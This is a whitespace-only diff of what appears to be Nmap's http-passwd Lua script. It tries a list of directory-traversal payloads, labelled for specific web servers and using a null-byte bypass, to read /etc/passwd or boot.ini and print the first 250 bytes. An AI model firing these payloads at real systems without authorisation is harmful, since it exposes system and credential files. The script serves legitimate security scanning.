@@ -72,19 +72,19 @@ categories = {"intrusive", "vuln"}
 --@param response The HTTP response from the server.
 --@return The body of the HTTP response.
 local validate = function(response)
-	if not response.status then
-		return nil
-	end
+  if not response.status then
+    return nil
+  end
 
-	if response.status ~= 200 then
-		return nil
-	end
+  if response.status ~= 200 then
+    return nil
+  end
 
-	if response.body:match("^[^:]+:[^:]*:[0-9]+:[0-9]+:") or response.body:match("%[boot loader%]") then
-		return response.body
-	end
+  if response.body:match("^[^:]+:[^:]*:[0-9]+:[0-9]+:") or response.body:match("%[boot loader%]") then
+    return response.body
+  end
 
-	return nil
+  return nil
 end
 
 --- Transforms a string with ".", "/" and "\" converted to their URL-formatted
@@ -92,19 +92,19 @@ end
 --@param str String to hexify.
 --@return Transformed string.
 local hexify = function(str)
-	local ret
-	ret = str:gsub("%.", "%%2E")
-	ret = ret:gsub("/", "%%2F")
-	ret = ret:gsub("\\", "%%5C")
-	return ret
+  local ret
+  ret = str:gsub("%.", "%%2E")
+  ret = ret:gsub("/", "%%2F")
+  ret = ret:gsub("\\", "%%5C")
+  return ret
 end
 
 --- Truncates the <code>passwd</code> or <code>boot.ini</code> file.
 --@param passwd <code>passwd</code> or <code>boot.ini</code>file.
 --@return Truncated passwd file and truncated length.
 local truncatePasswd = function(passwd)
-	local len = 250
-	return passwd:sub(1, len), len
+  local len = 250
+  return passwd:sub(1, len), len
 end
 
 --- Formats output.
@@ -112,83 +112,83 @@ end
 --@param dir Formatted request which elicited the good reponse.
 --@return String description for output
 local output = function(passwd, dir)
-	local trunc, len = truncatePasswd(passwd)
-	local out = ""
-	out = out .. "Directory traversal found.\nPayload: \"" .. dir .. "\"\n"
-	out = out .. "Printing first " .. len .. " bytes:\n"
-	out = out .. trunc
-	return out
+  local trunc, len = truncatePasswd(passwd)
+  local out = ""
+  out = out .. "Directory traversal found.\nPayload: \"" .. dir .. "\"\n"
+  out = out .. "Printing first " .. len .. " bytes:\n"
+  out = out .. trunc
+  return out
 end
 
 portrule = shortport.http
 
 action = function(host, port)
-	local dirs = {
-		hexify("//etc/passwd"),
-		hexify(string.rep("../", 10) .. "etc/passwd"),
-		hexify(string.rep("../", 10) .. "boot.ini"),
-		hexify(string.rep("..\\", 10) .. "boot.ini"),
-		hexify("." .. string.rep("../", 10) .. "etc/passwd"),
-		hexify(string.rep("..\\/", 10) .. "etc\\/passwd"),
-		hexify(string.rep("..\\", 10) .. "etc\\passwd"),
+  local dirs = {
+    hexify("//etc/passwd"),
+    hexify(string.rep("../", 10) .. "etc/passwd"),
+    hexify(string.rep("../", 10) .. "boot.ini"),
+    hexify(string.rep("..\\", 10) .. "boot.ini"),
+    hexify("." .. string.rep("../", 10) .. "etc/passwd"),
+    hexify(string.rep("..\\/", 10) .. "etc\\/passwd"),
+    hexify(string.rep("..\\", 10) .. "etc\\passwd"),
 
-		-- These don't get hexified because they are targeted at
-		-- specific known vulnerabilities.
-		'..\\\\..\\\\..\\..\\\\..\\..\\\\..\\..\\\\\\boot.ini',
-		--miniwebsvr
-		'%c0.%c0./%c0.%c0./%c0.%c0./%c0.%c0./%c0.%c0./boot.ini',
-		'%c0%2e%c0%2e/%c0%2e%c0%2e/%c0%2e%c0%2e/%c0%2e%c0%2e/boot.ini',
-		--Acritum Femitter Server
-		'\\\\..%2f..%2f..%2f..%2fboot.ini% ../',
-		--zervit Web Server and several others
-		'index.html?../../../../../boot.ini',
-		'index.html?..\\..\\..\\..\\..\\boot.ini',
-		--Mongoose Web Server
-		'///..%2f..%2f..%2f..%2fboot.ini',
-		'/..%5C..%5C%5C..%5C..%5C%5C..%5C..%5C%5C..%5C..%5Cboot.ini',
-		'/%c0%2e%c0%2e\\%c0%2e%c0%2e\\%c0%2e%c0%2e\\boot.ini',
-		-- Yaws 1.89
-		'/..\\/..\\/..\\/boot.ini',
-		'/..\\/\\..\\/\\..\\/\\boot.ini',
-		'/\\../\\../\\../boot.ini',
-		'////..\\..\\..\\boot.ini',
-		--MultiThreaded HTTP Server v1.1
-		'/..\\..\\..\\..\\\\..\\..\\\\..\\..\\\\\\boot.ini',
-		--uHttp Server
-		'/../../../../../../../etc/passwd',
-		--Java Mini Web Server
-		'/%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5cboot.ini',
-		'/%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5cetc%2fpasswd',
-	}
+    -- These don't get hexified because they are targeted at
+    -- specific known vulnerabilities.
+    '..\\\\..\\\\..\\..\\\\..\\..\\\\..\\..\\\\\\boot.ini',
+    --miniwebsvr
+    '%c0.%c0./%c0.%c0./%c0.%c0./%c0.%c0./%c0.%c0./boot.ini',
+    '%c0%2e%c0%2e/%c0%2e%c0%2e/%c0%2e%c0%2e/%c0%2e%c0%2e/boot.ini',
+    --Acritum Femitter Server
+    '\\\\..%2f..%2f..%2f..%2fboot.ini% ../',
+    --zervit Web Server and several others
+    'index.html?../../../../../boot.ini',
+    'index.html?..\\..\\..\\..\\..\\boot.ini',
+    --Mongoose Web Server
+    '///..%2f..%2f..%2f..%2fboot.ini',
+    '/..%5C..%5C%5C..%5C..%5C%5C..%5C..%5C%5C..%5C..%5Cboot.ini',
+    '/%c0%2e%c0%2e\\%c0%2e%c0%2e\\%c0%2e%c0%2e\\boot.ini',
+    -- Yaws 1.89
+    '/..\\/..\\/..\\/boot.ini',
+    '/..\\/\\..\\/\\..\\/\\boot.ini',
+    '/\\../\\../\\../boot.ini',
+    '////..\\..\\..\\boot.ini',
+    --MultiThreaded HTTP Server v1.1
+    '/..\\..\\..\\..\\\\..\\..\\\\..\\..\\\\\\boot.ini',
+    --uHttp Server
+    '/../../../../../../../etc/passwd',
+    --Java Mini Web Server
+    '/%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5cboot.ini',
+    '/%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5cetc%2fpasswd',
+  }
 
-	for _, dir in ipairs(dirs) do
-		local response = http.get(host, port, dir)
+  for _, dir in ipairs(dirs) do
+    local response = http.get(host, port, dir)
 
-		if validate(response) then
-			return output(response.body, dir)
-		end
-	end
+    if validate(response) then
+      return output(response.body, dir)
+    end
+  end
 
-	local root = stdnse.get_script_args("http-passwd.root") or "/"
+  local root = stdnse.get_script_args("http-passwd.root") or "/"
 
-	-- Check for something that looks like a query referring to a file name, like
-	-- "index.php?page=next.php". Replace the query value with each of the test
-	-- vectors. Add an encoded null byte at the end to bypass some checks; see
-	-- http://insecure.org/news/P55-01.txt.
-	local response = http.get(host, port, root)
-	if response.body then
-		local page_var = response.body:match ("[%?%&](%a-)=%a-%.%a")
-		if page_var then
-			local query_base = root .. "?" .. page_var .. "="
-			stdnse.print_debug(1, "%s: testing with query %s.", SCRIPT_NAME, query_base .. "...")
+  -- Check for something that looks like a query referring to a file name, like
+  -- "index.php?page=next.php". Replace the query value with each of the test
+  -- vectors. Add an encoded null byte at the end to bypass some checks; see
+  -- http://insecure.org/news/P55-01.txt.
+  local response = http.get(host, port, root)
+  if response.body then
+    local page_var = response.body:match ("[%?%&](%a-)=%a-%.%a")
+    if page_var then
+      local query_base = root .. "?" .. page_var .. "="
+      stdnse.print_debug(1, "%s: testing with query %s.", SCRIPT_NAME, query_base .. "...")
 
-			for _, dir in ipairs(dirs) do
-				local response = http.get(host, port, query_base .. dir .. "%00")
+      for _, dir in ipairs(dirs) do
+        local response = http.get(host, port, query_base .. dir .. "%00")
 
-				if validate(response) then
-					return output(response.body, dir)
-				end
-			end
-		end
-	end
+        if validate(response) then
+          return output(response.body, dir)
+        end
+      end
+    end
+  end
 end
